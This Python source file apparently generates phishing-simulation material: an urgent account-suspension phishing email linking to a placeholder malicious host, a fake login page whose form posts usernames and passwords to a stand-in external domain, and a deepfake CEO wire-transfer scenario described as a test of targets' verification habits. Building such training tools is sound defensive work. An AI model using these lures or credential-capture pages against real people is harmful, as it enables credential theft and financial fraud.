# src/scenario_content_gen.py (Updated for Phase 2)
import random

def generate_phishing_email(target_name: str, company_name: str, topic: str, link_text: str = "Click here"):
    subject = f"Urgent Action Required: Your {company_name} Account regarding {topic}"
    phishing_link = f"http://malicious-site.com/verify?campaign={topic.replace(' ', '_').lower()}_{random.randint(1000,9999)}"
    body = (
        f"Dear {target_name},\n\n"
        f"We have detected unusual activity on your {company_name} account regarding '{topic}'.\n"
        f"Please {link_text} to verify your details immediately:\n\n"
        f"{phishing_link}\n\n"
        f"Failure to do so may result in account suspension.\n\n"
        f"Sincerely,\n{company_name} Security Team"
    )
    return {"subject": subject, "body": body, "link": phishing_link}

def generate_malicious_website_html(campaign_name: str, site_type: str = "login_page"):
    fake_url = f"http://fake-{site_type.replace('_page', '').lower()}.com/{campaign_name.replace(' ', '_').lower()}/index.html"
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure {site_type.replace('_page', '').capitalize()} Portal</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    </head>
    <body>
        <div class="container mt-5">
            <h2>{site_type.replace('_page', '').capitalize()} Verification for {campaign_name}</h2>
            <p>Please enter your credentials to verify your identity.</p>
            <form action="{fake_url}/submit" method="post">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" class="form-control" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary">Submit</button>
            </form>
        </div>
    </body>
    </html>
    """
    return {"url": fake_url, "html": html_content}

def generate_deepfake_scenario_text(person_name: str, context: str):
    scenario_text = (
        f"Scenario: A deepfake audio/video of {person_name} is used in a social engineering attack.\n"
        f"Context: The deepfake claims to be {person_name} urgently requesting sensitive information or wire transfers related to '{context}'.\n"
        f"Objective: Test the target's ability to verify identity and follow secure procedures."
    )
    return scenario_text

if __name__ == "__main__":
    random.seed(42) # For reproducible examples

    print("--- Scenario Content Generation ---")

    # Example 1: Phishing Email for a general alert
    email_info = generate_phishing_email("Michael Chen", "TechSolutions Inc.", "Unusual Activity on Network")
    print("\n1. Generated Phishing Email:")
    print(f"Subject: {email_info['subject']}")
    print(f"Body (excerpt):\n{email_info['body'].splitlines()[0]}...\nLink: {email_info['link']}")

    # Example 2: Malicious Login Page HTML
    website_info = generate_malicious_website_html("Cloud Service Outage", "cloud_login_page")
    print("\n2. Generated Malicious Website HTML (URL and excerpt):")
    print(f"URL: {website_info['url']}")
    print(f"HTML (first 5 lines):\n{chr(10).join(website_info['html'].strip().splitlines()[:5])}...")

    # Example 3: Deepfake Scenario Outline
    deepfake_text = generate_deepfake_scenario_text("CEO Sarah Johnson", "Urgent Acquisition Funds Transfer")
    print("\n3. Generated Deepfake Scenario Text:")
    print(deepfake_text)

    print("\nContent generation capabilities expanded.")